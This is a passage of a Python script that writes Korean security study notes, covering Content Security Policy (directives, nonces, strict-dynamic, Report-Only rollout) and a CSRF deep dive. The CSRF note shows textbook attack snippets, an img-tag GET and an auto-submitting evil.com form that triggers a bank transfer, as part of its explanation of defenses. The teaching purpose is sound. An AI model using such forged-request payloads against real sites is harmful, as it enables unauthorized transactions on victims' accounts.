핵심 지시어: `default-src`(기본), `script-src`(JavaScript), `style-src`(CSS), `img-src`(이미지), `connect-src`(XHR/Fetch), `frame-src`(iframe), `object-src`(플러그인).

📢 **섹션 요약 비유**: 집(페이지)에 초대장(화이트리스트) 없는 손님(스크립트)은 들어올 수 없게 하는 경비원이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 지시어 | 설명 | 안전 예시 |
|:---|:---|:---|
| `default-src` | 기본 출처 정책 | `'self'` |
| `script-src` | JS 실행 출처 | `'self' 'nonce-abc123'` |
| `style-src` | CSS 출처 | `'self' 'sha256-...'` |
| `object-src` | 플러그인 | `'none'` |
| `upgrade-insecure-requests` | HTTP→HTTPS 강제 | — |

```
[CSP 동작 흐름]

서버 응답 헤더
  Content-Security-Policy: script-src 'self' 'nonce-xyz'
          │
          ▼
      브라우저 파싱
          │
    ┌─────┴─────┐
    │ 허용?     │
    ▼           ▼
 nonce=xyz    인라인 스크립트
 → 실행        (nonce 없음)
               → 차단 + report
```

📢 **섹션 요약 비유**: 공연장 입장권(nonce)을 가진 사람만 무대(실행)에 오를 수 있다.

---

## Ⅲ. 비교 및 연결

| 정책 | 보안성 | 구현 난이도 |
|:---|:---|:---|
| `'unsafe-inline'` 허용 | 낮음 | 쉬움 |
| nonce 기반 | 높음 | 중간 |
| hash 기반 | 높음 | 중간 |
| strict-dynamic | 매우 높음 | 어려움 |

`strict-dynamic`은 nonce로 허용된 스크립트가 동적으로 로드하는 스크립트도 자동 허용하므로, 레거시 코드와의 호환성을 유지하면서도 높은 보안성을 제공한다.

📢 **섹션 요약 비유**: strict-dynamic은 신뢰받은 경비원(nonce 스크립트)이 데려온 사람은 믿겠다는 정책이다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**CSP 보고서 엔드포인트**:
```
Content-Security-Policy: ...; report-uri /csp-violations
Content-Security-Policy-Report-Only: ...  (비차단 모드로 먼저 테스트)
```

**단계적 도입 전략**:
1. `Report-Only` 모드로 30일 위반 수집
2. 위반 항목 분석 후 허용 목록 정제
3. 실 차단 모드(`Content-Security-Policy`) 전환

**기술사 논점**: "CSP는 XSS 방어의 최후 방어선이지만, 정책 설계 실패(unsafe-inline 허용)가 더 큰 위험이 될 수 있다."

📢 **섹션 요약 비유**: 새 경비원(CSP)을 바로 배치하기 전에 먼저 관찰 모드(Report-Only)로 테스트하는 것이 현명하다.

---

## Ⅴ. 기대효과 및 결론

엄격한 CSP를 적용하면 미지의 XSS 취약점도 브라우저에서 차단되어 zero-day XSS에 대한 선제 방어가 가능하다. CSP 보고서를 SIEM에 연동하면 공격 시도 탐지 및 취약점 발견에 활용할 수 있다.

📢 **섹션 요약 비유**: 경비원 규정집(CSP 정책)이 촘촘할수록 몰래 들어오는 침입자가 없어진다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| nonce | CSP 구성 요소 | 요청별 랜덤 토큰 |
| Report-Only | 도입 단계 | 비차단 모드로 위반 수집 |
| strict-dynamic | 고급 정책 | 신뢰 스크립트 동적 허용 |
| XSS | 방어 대상 | CSP의 주요 방어 타깃 |

### 👶 어린이를 위한 3줄 비유 설명
CSP는 집(웹페이지)에 초대장(nonce)을 가진 손님(스크립트)만 들어올 수 있게 하는 규칙이에요.
초대장 없는 손님이 오면 문을 잠그고(차단) 경찰(리포트)에게 알려요.
처음엔 문을 안 잠그고 누가 오는지 지켜보다가(Report-Only), 나쁜 손님 목록을 파악한 후 잠그면 돼요.
""")

w("476_csrf_deep.md", """\
+++
weight = 476
title = "476. CSRF 심화 (Cross-Site Request Forgery Deep Dive)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: CSRF (Cross-Site Request Forgery)는 피해자가 인증된 상태에서 공격자가 유도한 요청이 서버에 자동으로 쿠키와 함께 전송되어 피해자 의도 없이 서버 상태를 변경하는 공격이다.
> 2. **가치**: XSS와 달리 서버 코드 취약점이 아닌 브라우저의 쿠키 자동 전송 메커니즘을 악용하므로, 방어가 개발 단계에서 명시적으로 구현되어야 한다.
> 3. **판단 포인트**: SameSite 쿠키 속성과 CSRF 토큰 중 어느 계층이 없는지 확인하는 것이 취약점 분석의 핵심이다.

---

## Ⅰ. 개요 및 필요성

CSRF 공격은 브라우저가 동일 도메인 쿠키를 자동으로 요청에 포함하는 특성(Cookie 자동 전송)을 악용한다. 피해자가 이미 `bank.com`에 로그인된 상태에서 공격자 사이트를 방문하면, 공격자 사이트의 `<img src="https://bank.com/transfer?to=attacker&amount=1000">` 같은 태그가 피해자 쿠키와 함께 은행에 요청을 보낸다.

2000년대 초반 대규모 피해를 야기했으며, OWASP Top 10에 2003년부터 2017년까지 꾸준히 포함되었다. 2021 버전에서 A01 접근 제어 실패에 합병되었다.

📢 **섹션 요약 비유**: 피해자의 공인인증서(쿠키)를 빼앗지 않고, 피해자 손을 잡고 서명란(요청)에 도장을 찍게 하는 공격이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 방어 기법 | 원리 | 한계 |
|:---|:---|:---|
| CSRF 토큰 | 요청마다 랜덤 토큰 검증 | 토큰 누출 시 무력화 |
| SameSite=Strict | 크로스 사이트 쿠키 전송 차단 | 일부 레거시 브라우저 미지원 |
| SameSite=Lax | GET 제외 크로스 사이트 차단 | GET 기반 변경 요청 취약 |
| Double Submit Cookie | 쿠키값=파라미터값 검증 | MITM 환경 취약 |
| Origin/Referer 검증 | 요청 출처 확인 | Proxy 환경 누락 가능 |

```
[CSRF 공격 흐름]

피해자 브라우저
  (bank.com 세션 쿠키 보유)
  │
  │ 공격자 사이트 방문
  ▼
evil.com 페이지
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
  </form>
  <script>document.forms[0].submit()</script>
  │
  │ 자동 제출 (쿠키 자동 포함)
  ▼
bank.com 서버
  유효한 쿠키 → 요청 처리 → 송금 완료
```

📢 **섹션 요약 비유**: 자는 동안 손을 잡아 도장을 찍게 하는 것처럼, 피해자 모르게 인증된 요청을 보낸다.

---

## Ⅲ. 비교 및 연결

| 항목 | CSRF | XSS |
|:---|:---|:---|
| 악용 대상 | 브라우저 쿠키 자동 전송 | DOM 실행 컨텍스트 |
| 서버 취약점 | 없음(정상 동작 악용) | 있음(출력 미검증) |
| 피해 내용 | 상태 변경(송금·삭제) | 정보 탈취·실행 |
| 방어 수단 | CSRF 토큰, SameSite | 인코딩, CSP |

XSS 취약점이 존재하면 CSRF 토큰을 탈취할 수 있으므로 XSS 방어가 선행되어야 한다.

📢 **섹션 요약 비유**: XSS는 집에 침입, CSRF는 집 열쇠(쿠키) 없이 복사본(자동 전송)으로 들어오는 것이다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**최신 권고 방어 조합**:
1. `SameSite=Lax` 기본 + 민감 작업은 `SameSite=Strict`
2. Synchronizer Token Pattern(동기화 토큰 패턴): 서버가 세션당 토큰 발급 → 요청 시 검증
3. `Origin` 헤더 검증 (Referer 대신 Origin 우선)

**프레임워크 내장**: Django CSRF middleware, Spring Security CSRF protection이 기본 활성화됨.

📢 **섹션 요약 비유**: SameSite는 열쇠 복사를 막고, CSRF 토큰은 도장을 찍을 때 추가 비밀번호를 요구하는 이중 자물쇠다.

---

## Ⅴ. 기대효과 및 결론

SameSite 쿠키와 CSRF 토큰을 함께 적용하면 현실적인 CSRF 공격의 거의 모든 경로가 차단된다. 특히 SameSite=Lax가 2020년 이후 Chrome의 기본값이 되면서 CSRF의 위협은 크게 감소했지만, 레거시 브라우저·서브도메인 공유 환경에서는 여전히 토큰 방어가 필요하다.

📢 **섹션 요약 비유**: 이중 자물쇠(SameSite + CSRF 토큰)가 있으면 남의 손을 잡아 도장 찍기가 불가능해진다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| SameSite 쿠키 | 방어 | 크로스 사이트 쿠키 전송 제한 |
| CSRF 토큰 | 방어 | 요청 진위 검증 토큰 |
| XSS | 연계 위협 | CSRF 토큰 탈취 가능 |
| Double Submit | 대안 방어 | 쿠키값-파라미터 일치 검증 |

### 👶 어린이를 위한 3줄 비유 설명
CSRF는 잠든 사람의 손을 잡아 도장을 찍게 하는 것처럼, 피해자 모르게 서류에 서명을 받는 공격이에요.
브라우저가 자동으로 쿠키(도장)를 가져가기 때문에 일어나는 일이에요.
SameSite와 CSRF 토큰이라는 두 자물쇠를 채우면 이런 도장 찍기를 막을 수 있어요.
""")

print("Batch 2 (474-476) done. Committing...")
